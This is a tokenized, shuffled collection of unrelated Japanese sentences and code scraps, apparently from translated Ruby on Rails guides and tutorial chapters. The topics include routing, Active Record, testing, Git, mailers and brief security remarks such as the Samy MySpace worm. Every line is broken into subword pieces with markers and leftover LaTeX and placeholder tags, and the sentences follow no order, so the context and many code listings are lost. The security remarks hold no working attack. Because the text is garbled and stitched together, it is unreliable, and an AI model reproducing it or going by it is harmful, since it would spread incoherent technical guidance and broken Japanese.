▁ 作成し た時点で のユーザー オブジェクトは 、\ k ode { id } 属性 、 マジックカラム である \ k ode { created \_ at } 属性 と \ k ode { updated \_ at } 属性の値 が いずれも \ k ode { nil } で あった ことを思い出してください 。
▁ タイトル を 自動 で 変 え る ぐらい の ことが \ emph { 真 の } 動的 コンテンツ と 呼 べ る かどうか は 議 論 の 余 地 がある と思います が 、 いずれ に し ろ この ページ は 、 第 \ ref { cha : sign _ up } 章で 紹 介 する 本格的な 動的 コンテンツ の基礎 となります 。
▁` require ` および 類似 の ディレクティブ は 、 出力 時に 同じ ファイルを 2 回 以上 インクルード しない ようになっています 。
▁これらの 属性 の 効 用 については 次の 2 つの 節 で説明します 。
▁ ブラウザで ` doc / guides / index ▖ html ` を開く ことで ガイド を参照 できます 。
▁ このような 場合には 、 単数形 リソース ▁( singular ▁resource ) ▁ を使用して ` show ` アクションに ▁( ` / profile / : id ` ではなく ) ▁` / profile ` を 割り当て ることができます 。
▁ セキュリティ上の issue を レポート する方法 については 次の セクション で説明します 。
▁ オーナー オブジェクトが destroy された ときに 、 オーナー に 関連付けられたオブジェクト を どう するか を 制御 します 。
▁ アセットを 上 記 の 論 理 的な 場所 へ 配置 すれば 、\ emph { マニフェストファイル } を使用して 、 それら を どのように 1 つの ファイルに まとめ る のか を Rails に 指示 することができます ▟ なお 、 実際に まとめ る のは \ href { https :// github ▖ com / s s te phens on / sprockets } { Sprockets } ▁gem が 行います 。
▁ここで 使 っている \ k ode { xhr } ▁( XmlHttpRequest ) ▁という メソッドは 、 Ajax で リクエストを 発行する します ▟ したがって 、 リスト \ ref { code : relationships _ controller _ ajax } の \ k ode { respond _ to } では 、 JavaScript に 対応 した 行 が 実行される ようになります 。
▁これにより 、 ルート にアクセスすると Application コントローラ内の \ k ode { hello } アクションに ルーティング される ようになった の でした 。
▁ 今後 は 、 この ` data - * ` 属性を リンク タグ に追加する だけで この動作 を簡単に 追加 できます 。
▁ ルート ルーティング を設定する ▟ {2} {/2} {3} config / routes ▖ rb {/3}
▁( 最後の 行 のように \ k ode { ex it } を実行すると rails ▁console を 終 了 できます 。
▁ こう して リレーションシップ を作成 しておけば 、 アプリケーションの インターフェイス を 開発 するには 十分です 。
▁Rails では データ のバリデーション ▁( validation ) ▁ が サポート されており 、 データモデル の 属性の値 に 制限 を かけ る ことができる 。
▁* ▁` update _ columns `
▁d ▁= ▁ DateTime ▖ new (201 0, ▁2, ▁28 , ▁ 23 , ▁ 59 , ▁ 59 )
▁ 他 愛 も ない いた ず ら だった かもしれませんが 、 Sam y の も と には 数 時間 のうち に 百万 件 以上の 友 達 リクエストが 集 まり 、 それによって MySpace に 膨大な トラフィック が発生し て サイト が オフ ラ イン に なってしまい ました 。
▁ 本書 は ソフトウェア 開発者 や 、 ソフトウェア 開発者 になり たい 方 々 のために 執 筆 されています ▟ ╼
▁ これはリスト \ ref { code : first _ create _ action } で使用されていました 。
▁ 「 hello 」 アプリ 「 toy 」 アプリ 「 sample 」 アプリ には 同じ ファイル名 が 多数 ある ため 、 これらの アプリ を 同じ プロジェクト に 置く と ファイル を見つけ に く くなる ことがあります 。
▁この 例 の場合 、 `@ part s ▖ assemblies ▖ create ` または `@ part s ▖ assemblies ▖ build ` を実行すると 、` factory ` カラム の 値が ` S eattle ` の 注文 ( order ) が 常に 作成されます 。
▁Bitbucket への リポジトリ 追加 と リポジトリ への プッシュ 。
▁ あるいは 、 フ ィ ッ シ ング サイト から ブラウザの セキュリティホール を経由して 邪悪な ソフトウェア を 注入 することもできます 。
▁<%= ▁f ▖ label ▁: title ▁%>< br >
▁== ▁Create Article s : ▁migrat ed ▁(0▖00 20 s ) ▁============= ============== ==============
▁ここでは 特に 、\ k ode { ac t i v ate } メソッド を作成して ユーザーの 有効化 属性 を更新し 、\ k ode { send \_ activation \_ email } メソッド を作成して 有効化 メールを送信 します 。
▁test モードでは デフォルトで ` false ` に設定され 、 それ 以外 では ` true ` に設定されます 。
▁config ▖ action _ mailer ▖ smtp _ settings ▁= ▁ {
▁上のように 20 年 で 期限切れ になる cookies 設定 は よく 使われ る ようになり 、 今 では Rails にも 特殊な \ k ode { permanent } という 専 用の メソッド が追加された ほど です ▟ この メソッドを使用すると 、 コードは 以下のように シ ン プ ル になります 。
▁ただし 、 現 時点 で この URL を使用して も エラー になります ▁( 図 \ ref { fig : profile _ routing _ error }) 。
▁build _ account
▁ EXPLAIN ▁for : ▁ SELECT ▁" users "▖
▁ 同じ要領で 、 public ディレクトリ の レ ス キュー ファイル ▁( いわゆる エラー ページ ) ▁ も ローカライズ できます 。
▁{0} 図 11 ▖ 11 {/0} {1} Home ページ ▁(\ href { http :// localhost :3000/}{/}) ▁ に フォロー 関連の 統 計 情報 を表示する ▟\ href { http :// railstutorial ▖ org / images / figures / home _ page _ follow _ stats _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁Rails が 解 釈 する REST には 、 標準的な URL セット と 、 データモデル と やりとり するための コントローラ アクション が含まれている 。
▁ 今回は \ k ode { assert \_ difference } という メソッドを使って テストを 書き ます 。
▁class ▁Application ▁< ▁Rails :: Application
▁ ユーザー登録ページ を 動 か す ことが できたので 、 この アプリケーションを デプロイ して 、 本番環境で も 動 か せる ように してみましょう 。
▁#### ▁hidden _ field
▁ここで もう 1 つ 微 妙 な 点を 指 摘 しておきたい と思います ▟ リスト { p 0} の {2} form _ for (@ user ) {/2} のコードは 、 リスト { p 3 } のコード と { 4 } 完全に {/4} 同じです ▟ だと すると 、 Rails は どうやって 新規ユーザー 用の \ text tt { POST } リクエスト と ユーザー 編集 用の \ text tt { PATCH } リクエストを 区別 する のでしょうか 。
▁(\ ref { sec : hashes _ and _ symbols } で 、 シンボル に ハイフン が 使 え なかった ことを思い出してください )
▁ここで の タスク 定義 は 、 Rails 全体 の コンポーネント に対して 定義 されます 。
▁Rails で はデフォルトで アセットパイプライン が有効になってい ます 。
▁これで ` Template ` クラス が で きました ので 、 続いて テンプレート ファイルの 拡張子 と の関連付け を行います 。
▁Rails アプリケーション のバージョン が 3▖2 より 前 の場合 、 まず 3▖2 へのアップグレード を 完了 してから Rails ▁4▖0 へのアップグレード を開始 してください 。
▁Git h ub への issue 送信 、 コメント 、 プルリクエスト の作成 を行う には 、 まず GitHub アカウント ▁( 無料 ) ▁ を作成する必要があります 。
▁HTTP /1▖1 ▁ 302 ▁F ound ▁[ 最初は 通常の 302 レスポンス ]
▁remove _ method ( method _ name )
▁` config ▖ middleware ▖ swap ` を使用することで 、 ミドルウェアスタック 内の ミドルウェア を 交 換 できます 。
▁self を省略した 結果を リスト \ ref { code : add _ micropost _ different _ owner } に示します 。
▁Active ▁Record について
▁I 18 n ▖ locale ▁= ▁: expert ▁if ▁current _ user ▖ expert ?
▁invoke ▁assets
▁ 文字列 はデフォルトで は ▁ _ un safe _ ▁ と マーク されます 。
▁たとえば 、 Rails アプリケーションに 以下の モデル が あるとします 。
▁` local s : ▁ { } ` オプションを使用することで 、 レンダリング 中の どの パーシャル にも 任意の 名前 の ローカル変数 を渡すことができます 。
▁`: location ` を使用することで 、 HTTP の ` Location ` ヘッダー を 設定 できます 。
▁<%= ▁render ▁@ customer ▁%>
▁上のコード の動作 は次のとおりです ▟ 指定された id を持つ 本 が 見つからない 場合は 、 モデル 内の すべての 蔵 書 リスト を `@ books ` インスタンス変数 に保存 します ▟ 続いて flash による 警 告 メッセージ を追加し 、 さらに ` index ▖ html ▖ erb ` テンプレート を直接 レンダリング してから 出力結果 を ブラウザに 送 り 返します 。
▁development :
▁たとえば 、\ k ode { name } は 空 で あって は な らず 、\ k ode { email } は メールアドレス の フォーマット に従う 必要があります 。
▁ Faker ▁gem の \ emph { lo re m ▁ ip sum } サンプル テキスト は ランダム に 生成される 仕 様 になっている ため 、 サンプル マイクロポスト の内容は この 図 と 違 っている はずです 。
▁### ▁` ordinalize `
▁ 前 述 した ように 、` Gemfile ` に記述 した gem は Rails の 読み込み 時に 読み込まれます 。
▁この節では 、 Sass が提供する 2 つの 重要な 機能 、\ emph { ネスト } と \ emph { 変数 } について説明します 。
▁Application コントローラに \ k ode { hello } を追加する ▟ {3} {/3} { 4 } app / controllers / application _ controller ▖ rb {/4}
▁ メイラー のテスト 方法 の詳細については テスティング ガイド の [ メイラー をテストする ]( testing ▖ html # メイラー をテストする ) を参照してください 。
▁上の 例 の場合 、 以下のように ルーティング を 宣言 することができます 。
▁=> ▁[" n ", ▁" a ", ▁" m ", ▁" e "]
▁self を省略した 結果を リスト \ ref { code : micropost _ dependency } に示します 。
▁この場合 、 テンプレート を ` app / views / articles / new ▖ html ▖ erb ` に 置く のが 最も シ ン プ ル です 。
▁ここでは 、\ k ode { ’ shared / error _ messages ’} という パーシャル を \ k ode { render } ▁( レンダリング ) ▁ し ている点に注目してください ▟ これは Rails 全 般 の慣習 で 、 パーシャル は 複数の コントローラに わ た る ビュー に対し 、 専 用の \ k ode { shared / } ディレクトリ を使用する ようにしています
▁#### ▁url _ field
▁* ▁` config / application ▖ rb `
▁ 複数形 リソース の場合と同様 に 、 単数形 リソース でも _ path ヘルパー に対応する ` _ url ` ヘルパー が 使用できます ▟ _ url ヘルパーは 、 _ path の 前に 現在の ホスト 名 、 ポート 番号 、 パス の プレフィックス が追加され ている 点 が異なります 。
▁これ より コメント の 部分 に 適切な コード を追加します 。
▁NOTE : ▁ イニシャライザ を 置く ディレクトリに サブ フォルダ を 作 って イニシャライザ を 整 理 することもできます ▟ Rails は イニシャライザ 用の ディレクトリ の 下 の すべての 階層 を探し て 実行 してくれます 。
▁ パスワード の モデル ▁( リスト \ ref { code : find _ authenticate _ user }) ▁ と 記憶トークン ▁( リスト \ ref { code : persistent _ current _ user }) ▁ で学んだ こと を元に 、 次のような コード で ユーザーを 検索 して 認 証 する ことにします 。
▁$ ▁rails ▁generate
▁now ▁= ▁ DateTime ▖ current
▁get ▁' : controller / : action / : id / with _ user / : user _ id '
▁def ▁ expiration _ date _ cannot _ be _ in _ the _ past
▁これらの 要素を 1 つ に まとめると 、 リスト \ ref { code : micropost _ validity _ test } のような テストコード になります 。
▁この テストでは 、 ユーザー登録 ボタン を 押 したときに ▁( ユーザー情報 が 無効 である ために ) ▁ ユーザーが \ emph { 作成 されない } ことを確認します 。
▁ まず 初 め に \ k ode { first } メソッドです 。
▁< h 1> Listing ▁Article s </ h 1>
▁ 削除 機能 をテストする には 、 管理者 を作成する ファクトリー があると 便利です 。
▁Ruby ▁on ▁Rails ▁3▖2 ▁ チュートリアル
▁Active ▁Record を使用し ていれば 、 利用 している データベース システム の種類 にかかわらず 、 同じ 表 記 を使用できます 。
▁Web アプリケーション には 動的な 部品 が たくさん あるので 、 熟 練 した 技術 を 身 に 付ける には 十分です 。
▁ここで ご 注 目 い ただ き たい のは 、 マイグレーション は 通常の ` create _ articles ` ではなく ` create _ blorgh _ articles ` という 名前 で 呼 ば れる という 点 です 。
▁Ruby は 組み込み クラス を含む {0} あらゆる {/0} クラス に メソッドを 追加 できる ことを { p 1 } で 学 び ました 。
▁これ と 対 になる \ k ode { after (: all )} を使用して 、 完了 後 ユーザー をすべて 削除します 。
▁ 本書 で学んだ すべて を 駆 使 することで 、 フォローしているユーザー のマイクロポスト 一覧 を ステータスフィード に 表示 させる ことができ た
▁もちろん 、 シ ン プ ル になった ということは 完成 度 が \ emph { さらに } 高 ま った ということ の 証 し であり 、 退 化 した わけではありません ▟\ ref { cha : a _ toy _ app } で scaffold に 頼 り き り だった 頃 から ここに 至 る まで は 長い 道 の り でした が 、 今 では scaffold が 生成する ような 複雑な コード はほとんど 不要 になりました 。
▁作成した コードをリスト \ ref { code : destroy _ session } に示します
▁method ▖
▁この 注 釈 の 意味 が よく わからない 場合は 、 無視 しても構いません 。
▁belongs _ to ▁: account
▁ただし エディタ の カスタマイズ は 何か と 厄 介 で エラー も 起 き やすい ので 、 この 解説 は あくまで 上 級 者 向 け です ▟ S ublime ▁Text は 、 デフォルト 設定 のまま でも Rails アプリケーションの エディタ として 十分 に 機能 します 。
▁Action ▁Mailer ▁ の基礎
▁\ label { fig : user _ index _ mockup } }╼\ end { figure }╼╼ ╼ ▁\ subsection { ユーザー インデックス } ▁% ▁( fold )╼ ▁\ label { sec : users _ index }╼╼
▁ ちなみに 、\ k ode { log } コマンドで コミットメッセージ の 履 歴 を参照 できます 。
▁X - S er ve d - B y : ▁cache - d f w 18 28 - D F W
▁上のコードによって以下 の HTML が生成されます 。
▁\ text tt { let } の 引数 は シンボル であり 、 さらに ブロック を引数に取り ます ▟ その ブロック は 、 この シンボル 名 を持つ ローカル変数 に 値 を返します 。
▁store
▁ SSH 公開鍵 を追加する 。
▁Fin is h ed ▁in ▁0▖0 19 99 ▁second s
▁ チュートリアル が 統合 的に 構成 されている ことにより 、 本書 を 最 後 まで 完了 する ことができ れば 、 現時点の Web 開発 の 知識 量 に 関 わ らず 、 より 高度な 情報 源 を 難 なく 読み こ な す 実 力 が 身 に つ き 、 上に 挙 げ た JavaScript などの Rails 以外の トピック についても 理解 しやすくなり ます 。
▁リスト { p 0} の {2} Gemfile {/2} を 、 実際に 使用する 正 確 な バージョンの gem に置き換え た もの を リスト \ ref { code : gemfile _ sqlite _ version } に示します 。
▁この 例 では 、` in _ groups ` メソッドは 一部の グループ の 後 ろ を 必要に応じて ` nil ` 要素 で 埋 め ている のが わかります 。
▁ シンボル は 文字列 と似ています が 、 ク ォ ート で 囲 む 代わりに コロン が 前 に置かれている 点 が異なります 。
▁この \ k ode { following \_ id s } メソッドは 、 実は Active ▁Record によって \ k ode { has \_ many ▁: following } 関連付け から 自動生成 された ものです ▁( リスト \ ref { code : has _ many _ following _ through _ active _ relationships })▟ これにより 、\ k ode { user ▖ following } コレクション に対応する id を得る ための \ k ode { \_ id s } を 、 関連付け の名前 に追加する だけで済みます 。
▁\ ref { sec : the _ relationship _ model } では や や 複雑な データ モデリング の 技術 を 説明しました ▟ 理解 するのに 時間 が か か って しま って も 大丈夫 なので 、 安 心 してください 。
▁mail _ in _ production ▁( end ) ╼╼% ▁section ▁password _ reset ▁( end )╼╼ \ section { 最後に } ▁% ▁( fold )╼\ label { sec : resets _ co nclusion }╼╼
▁ ブラウザで < http :// localhost :3000/ articles / new > を開く と 、 今は ルーティング エラーが表示され ます 。
▁\ emph { Ruby ▁on ▁Rails チュートリアル } では 、 一 貫 した Web 開発 技 法 を学ぶ ために ▁3 ▁ つの サンプルアプリケーション を 作り ます ▟\ emph { hello } アプリ ▁(\ ref { sec : the _ hello _ application }) 、 もう少し だけ 複雑な \ emph { toy } アプリ ▁( {3} 第 {2} 2 {/2} 章 {/3} ) 、 実 践 的な \ emph { sample } アプリ ▁( { 4 } 第 {2} 3 {/2} 章 {/4} から { 5 } 第 {2} 12 {/2} 章 { / 5 } まで ) ▁ です 。
▁* ▁` asset - path (" rails ▖ png ") ` は ` " / assets / rails ▖ png " ` に変換 される
▁#### ▁ レイアウト の 探 索 順序
▁ ╼ / ▖ bundle ╼╼ # ▁I gnore ▁the ▁default ▁SQLite ▁database ▖
▁ Math ▖ co s (0) ▖ to _ i ▖ object _ id ▁# ▁=> ▁3
▁scaffold で作成した Users リソース は 、 Rails の概要 を 手 っ 取り 早く 説明 するには 良い のですが 、 以下のような さまざまな 問題 点を 抱 え ています 。
▁ 今回は \ k ode { flash } 内に 存在する キー がある か を調べ 、 もし あれば その 値 ▁( メッセージ ) ▁ を 全て 表示する ように 、 レイアウト を 修正 します 。
▁ エンジンの モデル クラス と コントローラ クラスは 、 オ ー プ ン クラス として メ イン の Rails アプリケーションで 拡張 可能です ▟ Rails の モデル クラス と コントローラ クラスは 、 Rails 特有の 機能 を継承し ている ほ か は 通常の Ruby クラス と 変 わ り ありません 。
▁ここで 重要なのは 、 User オブジェクト そのもの の 論理値 は 常に true になる ことです ▟ その おかげで 、\ k ode {@ current \_ user } に 何も 代入 されていない とき だけ \ k ode { find \_ by } 呼び出し が 実行 され 、 無駄な データベース 読み出し が 行われ なくなります 。
▁ 言い 換 え れば 、 この クエリ は ` where ` に 引数 を付け ずに 呼び出し 、 直後 に ` where ` 条件 に ` not ` を渡して 連 鎖 させる ことによって 生成 されています 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁ここで コミット について 少し 解説 しておきます ▟ Git における コミット は 、 あくまで \ emph { ローカル } マシン 上で の 操作 である ことに注意してください 。
▁#### ▁ 名前付き 日付 時刻
▁ コメント の 英語 は 大文字 で 始 め ること 。
▁╼╼ ▁\ subsection { 読み 物 ガイド } ▁% ▁( fold )╼ ▁\ label { sec : guid e _ to _ f ur the r _ resources }╼╼
▁上のコードによって以下 が生成されます 。
▁(\ ref { sec : sample _ app _ setup } で Application コントローラに \ k ode { hello } アクション を追加した 場合は 、 今のうちに アクション を削除し ておく ことをおすすめします ) 。
▁( 次 章で 完全な フィード を実装する ため ) ▁ 今回は { p 0} で紹介した {2} where {/2} メソッドで これを実現 します ▟ {2} Micropost {/2} モデルに 変更 を加え た 結果を 、 リスト \ ref { code : proto _ status _ feed } に示します
▁* ▁Action ▁Mailer クラス のテスト 方法
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / array / prepend _ and _ append ▖ rb ` です 。
▁ 何 でも よい
▁ ╼ ▁other _ user ▁= ▁users (: ma lo ry )╼ ▁log _ in _ as ( other _ user )╼ ▁get ▁root _ path ╼ ▁ assert _ match ▁" 0 ▁microposts ", ▁response ▖ body ╼ ▁other _ user ▖ microposts ▖ create !( content : ▁" A ▁micropost " )╼ ▁get ▁root _ path ╼ ▁ assert _ match ▁ FILL _ IN , ▁response ▖ body ╼ ▁end ╼ end ╼\ end { code }╼\ end { code listing } ╼╼% ▁subsection ▁micropost _ tests ▁( end )╼╼ ▁% ▁section ▁ manipulati n g _ microposts ▁( end )╼╼ ╼ ▁\ section { マイクロポストの 画像 投 稿 } ▁% ▁( fold )╼ ▁\ label { sec : micropost _ images }╼╼
▁ コードが 重複 しないよう 、 このとき Users コントローラ から も \ k ode { logged _ in _ user } を 削除 しておきましょう 。
▁\ k ode { log \_ out } メソッド
▁上の デバッグ情報 では 、 フォーム 送信 の結果 が 、 送信された 値 に対応する 属性 と とも に \ k ode { user } ハッシュ に保存 されています ▟ ハッシュの キー は 、\ k ode { input } タグ の \ k ode { name } 属性 です ▁( リスト \ ref { code : signup _ form }) 。
▁ ▖ secret
▁ 永続的セッション のテスト
▁validates ▁: name , ▁: login , ▁: email , ▁presence : ▁true
▁{0} 図 6 ▖4{/0}{1} 素晴らしい 正規表現 エディタ \ href { http :// www ▖ rubular ▖ com /}{ Rubular } ▟\ href { http :// railstutorial ▖ org / images / figures / rubular - full ▖ png }{( 拡大 ) }{/1}
▁ 他 方 、` advance ` と ` change ` も 定義 されています が これらは さらに 多くの オプション をサポートしてい ます ▟ これら については 後 述 します 。
▁( Rails が 属性 の 存在性 を 検 査 するときに 、 エラーメッセージ は ヒント になります ▟ これ には \ k ode { blank ?}
▁また 、 ここでは ▁“ followers ” ▁という 語 は \ emph { ラベル } として 使用している ので 、 フォロワー が 1 人 の 場合にも 複数形 のまま とします 。
▁create ▁test / models / user _ test ▖ rb
▁つまり 「 ` { ▁: a ▁=> ▁: b ▁}` 」 よりも 「 ` { ▁a : ▁: b ▁}` 」 が望ましい 。
▁C HA N G E LO G は すべての リリース で 重要な 位 置 を 占 め ます 。
▁これは 、 プログラマ にとって は 便利な 方法 ですが 、 本番環境 にとって は 非 効率 です ▟ それ という の も 、 最小化 されていない CSS や JavaScript ファイルを 多数 インクルード すると 、 ページの 読み込み 時間 が 著 しく 遅 くなる からです ▁( 読み込み 時間 は 、 ユーザー 体 験 の 質 に 影 響 を与える 重要な 指 標 の 1 つ です ) 。
▁micropost ▖ user
▁ プロフィール 用 リンク が表示されている ことを確認する
▁ 最終的に 、 この follow / unfollow フォーム には ボタン しか ないこと を 理解 して いた だけ た と思います ▟ しかし 、 それ でも この フォーム は \ k ode { followed \_ id } を コントローラに 送信 する必要があります 。
▁( 本チュートリアル で 初めて 紹 介 した テクニック ですが 、 この テクニック については 第 10 章で もう一度 取り上げ ます ▟ そこで は コールバック を定義する ときに {0} メソッド を参照 する {/0} という 慣習 について説明します ▟) {1} \ emph { }{/1}
▁Active ▁Job には 、 S ide k i q 、 Re s q ue 、 D el a y ed ▁Job など さまざまな キュー イン グ バックエンド に 接続 できる アダプタ が ビルトイン で 用意されています 。
▁<%= ▁render ▁" shared / footer " ▁%>
▁また 、 エラーメッセージ に \ k ode {" In valid "} という 単語 が含まれている ことも テスト します 。
▁` pluck ` を使用すると 、 以下のような コードを シンプルな もの に置き換える ことができます 。
▁ よく 使用される ヘッダー の リスト を以下に示します 。
▁╼╼ ▁% ▁subsection ▁the _ first _ signup ▁( end )╼╼ \ subsection { 成功 時の テスト } ▁% ▁( fold )╼\ label { sec : a _ test _ for _ valid _ submission }╼╼
▁1 番目の 方法 は次のとおりです 。
▁{0} 図 9 ▖9{/0} ▁{1} ユーザー一覧ページ に ユーザーが 1 人 しか 表示 されていない {/1}
▁Windows ユーザーは 、 InstallRails で 推 奨 された 手順 に 従 った 場合 であっても 、 Rails インストーラ が 古 い という 警 告 が表示される 可能性があります ▟ また 、 最新の チュートリアル と の 互換性 が 保 た れ ない 可能性 もあります 。
▁use ▁Rails :: Rack :: Logger
▁{0} リスト 2▖ 3 {/0} ▁╼╼{1} ルート から users への ルーティング を追加する {2} {/2} ▁ {3} config / routes ▖ rb {/3} {/1}
▁ プリプロセッサ エンジン は つ な げ て 実行する ▁( chain ) ▁ ことができます 。
▁ 変更 後 のルーティング ファイルを 図 \ ref { fig : home _ root _ route } に示します 。
▁ アプリケーションを 本番 展開 したり 、 サンプルデータを 本番 データ として 作成 することもできます ▁( 本番 データベース を リ セット するには \ k ode { pg : reset } タスク を使用します ) 。
▁extend ▁ ActiveSupport :: Concern
▁ ハ イ ラ イ ト 行 は 通常 、 コード に 追加 された 行 を示します が 、 その 前 に示した コード と の違い を 強 調 している ことも よく あります ▁( 常に という わけではありません が ) 。
▁# ▁この オブジェクトは 複 製 された ので 、 複 製 された 方 に だけ 要素 が追加された
▁次の 図 \ ref { fig : filled _ in _ form } に示すように 、 テキストフィールド ▁(\ k ode { type =" text "} と \ k ode { type =" email " }) ▁ では 内容 をそのまま 表示 しています が 、 パスワード フィールド ▁(\ k ode { type =" password " }) ▁ では セキュリティ上の 目的 のために 文字 が 隠 蔽 されています ▁( 図 \ ref { fig : filled _ in _ form }) 。
▁( 訳 注 : ▁この 項 は スキップ できます ▟ もし うまく い か なければ スキップ しても 大丈夫 です ) ▁\ ref { sec : image _ resizing } で実装した 画像 アップ ロー ダ ー は 、 開発環境 で 動 か す 分 には 問題 ない のですが 、 本番環境 には 適 していません ▟ これはリスト \ ref { code : image _ uploader _ resizing } の \ k ode { storage ▁: file } という 行 によって 、 ローカル の ファイルシステム に 画像 を保存する よう になっている からです ▁( 訳 注 : ▁ただし Heroku の ファイルシステム は 一時 的に しか 使 え 無 い ので 、 本番 にデプロイする たびに 画像 が 消え ます ) 。
▁\ k ode { index } アクション で ユーザーの サインイン を要求する 。
▁ attr _ name ▁= ▁attribute ▖ to _ s ▖ tr (' ▖ ', ▁' _ ')▖ humanize
▁\ k ode { assert _ select } には 色 々 な 指定 の 仕 方 があります ▟ その 代 表 例 をいくつか 表 \ ref { table : assert _ select } で 紹介します 。
▁### ▁ コード から パス や URL を生成する
▁number ▖ object _ id ▁== ▁duplicate ▖ object _ id ▁# ▁=> ▁true
▁3 ▖ me g abytes ▁# ▁=> ▁31 4 57 28
▁p ▁= ▁ Product ▖ new
▁ 他の アップグレード が 完全に 完了 する まで は 、 既存の ` secret _ token ` をそのまま に して ` secret _ key _ base ` を 設定 せず 、 非推奨 警 告 を 無視 する という 選択 肢 もあります 。
▁ 正 式 には ここでは 不要 ですが 、\ k ode { nav } タグ はその 内 側 が ナビゲーション リンク である という 意図 を 伝える 役 割 があります 。
▁ ど な た でも Rails ガイド の 改 善 に 貢献 することができます ▟ Rails ガイド に 求 め られる 改 善 とは 、「 一 貫 している こと 」「 矛盾 が ないこと 」「 読みやすい こと 」「 情報 の 追加 」「 事 実 と 異 な っている 部分 の 修正 」「 タ イ ポ の 修正 」「 最新の ed ge ▁Rails に 追 い 付 く こと 」 など です 。
▁この パターン に 一致する メールアドレス だけ が 有効 であること を チェック します
▁sample ▁application ▖
▁ RubyGems の詳細については 、[ RubyGems ガイド ]( http :// rubygems - guides - jp ▖ heroku app ▖ com / ) を参照してください 。
▁このコードは ブラウザ 上で は 何も 表示 しません が 、 Rails の 内部で 使用される 特別な コード です ▟ ▁ したがって 、 どう い った 意図 で生成された のか は 、 現時点では まだ 理解 し なくても 大丈夫 です 。
▁このメソッドは 、 画像 用の 属性 名 に応じて 、 CarrierWave が自動的に 生成 してくれる メソッドです 。
▁ フォロー ボタン が 動く ようになった ので 、 バグ を 検 知 するための シンプルな テストを 書 い ていきましょう 。
▁<% ▁content _ for ▁: special _ script ▁do ▁%>
▁Ruby では 、 角 かっこ 以外に も 配列 の 要素 にアクセス する方法 が 提供され ています
▁上 から わかるように 、 この バリデーション では ` Person ` に ` name ` 属性 がない場合 に 無効 であること を 知 ら せ ます 。
▁invoke ▁helper
▁この章では 、 {0}{1} 第 3 章 {/1}{/0} で使用した 例を 基 に 、 Rails において 重要 となる Ruby の さまざまな 要素 について 探 って い く ことにしましょう ▟ { 2
▁ Factory ▁Girl を使用すると 、 Active ▁Record が アクセス を 許可 しないよう な \ k ode { created _ at } 属性 も 手動で 設定 できる ので 大 変 便利です
▁ パ イ プ ラ イン が 有効 で かつ 現在の 環境で 無効 になって い ない場合 、 この ファイルは Sprockets によって 扱 われます 。
▁class ▁T ra sh able C le an up J ob
▁# ▁If ▁you ▁find ▁yourself ▁ignoring ▁temporary ▁files ▁generated ▁by ▁your ▁text ▁editor
▁最初の 例 では ▁** 11 ** ▁ 回 も クエリ が 実行 されました が 、 今 度 の例では わずか ▁** 2 ** ▁ 回 に まで 減 りました 。
▁ アセット の キャッシュストア
▁ テキスト 、 JSON 、 XML を出力する こともできます 。
▁ ロケール ファイル も 、 アプリケーション の場合と同様 ` config / locales ` ディレクトリに 置 け ば よい ようになっています 。
▁login _ path
▁ 構成 される 時間 が 、 実行 プラットフォーム の ` Time ` で サポート される 範囲 を 超 え ている 場合は 、 u sec は 破棄され 、` DateTime ` オブジェクトが 代りに 返 されます 。
▁` update ` アクションは 従来 通り 使用 でき 、` PUT ` リクエスト は 今後 も ` update ` アクションに ルーティング されます 。
▁Time ▖ local (200 0, ▁7 , ▁31)▖ prev _ quarter ▁# ▁=> ▁Sun , ▁30 ▁Apr ▁2000
▁TIP : ▁Ruby ▁1▖8▖7 ▁p 2 48 および p 2 4 9 には Rails を ク ラ ッ シ ュ させる マ ー シ ャ リ ング バグ があります 。
▁# ▁`: debug ` を指定すると 今後 のデフォルト 設定 が 使用される
▁< strong > Comment er : </ strong >
▁#### ▁d ist ance _ of _ time _ in _ words
▁| t mp / | キャッシュ 、 p id 、 セッション ファイル などの 一時 ファイル が置かれます 。
▁< th ▁ col span =" 2 "></ th >
▁たとえば GitHub ユーザー である JohnSmith が 、 for k して https :// github ▖ com / JohnSmith / rails の " o range " という トピックブランチ に push した とします 。
▁@ article ▖ save
▁なお 、\ emph { Rails チュートリアル } では 、\ k ode { _ path } 書 式 を使用する 一般的な 規 約 に従い 、 リダイレクト の場合 のみ \ k ode { _ url } 書 式 を使用します 。
▁id = \ k ode {1} の ユーザーを削除する アクション
▁* ▁` proxy _ association ▖ owner ` は 、 関連付けを 所有 する オブジェクトを返します 。
▁以前のバージョン の Rails では 、\ k ode { モデル } 層 で \ emph { attr \_ accessible } メソッドを使用することで 上のような 危 険 を 防止 していました が 、 ▁Rails ▁4▖0 では コントローラ 層 で \ emph { S trong ▁Parameters } という テクニック を使用すること が 推 奨 されています 。
▁# ▁=> ▁true
▁最後に 以下を実行し ます 。
▁| ▁** Server ▁ Error ** ▁| ▁50 0 ▁| ▁: internal _ server _ error ▁|
▁# ▁active _ model / serialize rs / xml ▖ rb
▁Git の エディタ オプションで \ k ode { subl } や \ k ode { gvim } に フラグ を付け ない と 、 この あたり の動作 で 頭 が 混 乱 する かもしれません ▁( 訳 注 : ▁git の エディタ 設定 は GUI エディタ と あまり 相 性 が よく ない ら しく 、 v im や na no のような コマンド ベースの エディタ を 選択 する のが 無 難 な よう です ) 。
▁\ k ode { about } アクション が追加された StaticPages コントローラ
▁` create ` アクション も 、` save ` の結果 が ` false ` の 場合には 、` redirect _ to ` ではなく 、` new ` テンプレート に対する ` render ` を実行する ように 変更 されました 。
▁ フィクスチャ 向 け の digest メソッド を追加する
▁if ▁ discount ▁> ▁total _ value
▁index アクションに 対応 している ビュー
▁ sanitize ▁@ article ▖ body
▁{0} 図 1 2▖1 3 {/0} ▁{1} プロフィール画面 ▁(\ href { http :// localhost :3000/ users /5}{/ users /5}) ▁ に ▁[ Unfollow ] ▁ボタンが表示されている {/1}
▁この 事例 から 、 ブラックリスト フィルタ が 完全に なる ことは 永 遠 に あり え ないこと 、 そして HTML / JavaScript を Web アプリケーションで 許可 すること に 困難 が 伴 う 理由 を お わ か り いた だけ る と思います 。
